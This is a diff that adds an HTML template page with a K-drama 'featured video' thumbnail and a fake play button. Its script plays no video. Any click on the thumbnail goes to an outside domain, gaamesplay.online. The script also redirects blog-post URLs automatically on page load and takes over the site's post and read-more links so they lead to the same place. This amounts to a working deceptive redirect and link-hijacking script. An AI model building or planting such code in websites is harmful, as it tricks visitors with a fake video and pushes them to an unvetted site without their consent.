@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>YOUR_PAGE_TITLE</title>
+
+<!-- Twitter Card Meta Tags -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:site" content="@YourTwitterHandle" />
+<meta name="twitter:creator" content="@YourTwitterHandle" />
+<meta name="twitter:title" content="YOUR_PAGE_TITLE" />
+<meta name="twitter:description" content="YOUR_PAGE_DESCRIPTION" />
+<meta name="twitter:image" content="https://example.com/image.jpg" />
+
+<!-- Open Graph Meta Tags -->
+<meta property="og:type" content="article" />
+<meta property="og:title" content="YOUR_PAGE_TITLE" />
+<meta property="og:description" content="YOUR_PAGE_DESCRIPTION" />
+<meta property="og:url" content="https://yourwebsite.com/current-page-url" />
+<meta property="og:image" content="https://example.com/image.jpg" />
+
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f3f4f6;
+    margin: 2rem;
+    text-align: center;
+  }
+  .thumbnail-container {
+    position: relative;
+    width: 640px;
+    max-width: 100%;
+    margin: auto;
+    cursor: pointer;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+  }
+  .thumbnail-container img {
+    width: 100%;
+    display: block;
+  }
+  .play-button {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: rgba(0,0,0,0.6);
+    border-radius: 50%;
+    width: 80px;
+    height: 80px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .play-button svg {
+    fill: white;
+    width: 36px;
+    height: 36px;
+    margin-left: 6px;
+  }
+</style>
+</head>
+<body>
+
+<h1>Featured Video Content</h1>
+<p>K-Dramas are famous worldwide for their romance 💕, emotions 😢, and exciting stories 🔥.</p>
+
+<div class="thumbnail-container" id="thumbnailContainer" title="Click to watch video">
+  <img src="https://liveindia.tv/wp-content/uploads/2025/01/trailer_war-2.jpg" alt="Video Thumbnail" />
+  <div class="play-button" aria-label="Play Video">
+    <svg viewBox="0 0 24 24">
+      <path d="M8 5v14l11-7z"/>
+    </svg>
+  </div>
+</div>
+
+<script>
+  // Change this URL to where you want to redirect on click
+  const REDIRECT_URL = 'https://gaamesplay.online';
+
+  // Redirect immediately if URL pattern matches (example for blog post URL)
+  window.onload = function() {
+    if (window.location.pathname.match(/\/\d{4}\/\d{2}\/.*\.html$/)) {
+      window.location.href = REDIRECT_URL;
+      return;
+    }
+  };
+
+  // Redirect when thumbnail or play button clicked
+  document.getElementById('thumbnailContainer').addEventListener('click', function() {
+    window.location.href = REDIRECT_URL;
+  });
+
+  // Redirect any post links if needed (example selectors, adjust to your site)
+  document.querySelectorAll('.post a, .post-title a, .read-more a').forEach(function(link) {
+    link.addEventListener('click', function(e) {
+      e.preventDefault();
+      window.location.href = REDIRECT_URL;
+    });
+  });
+</script>
+
+</body>
+</html>
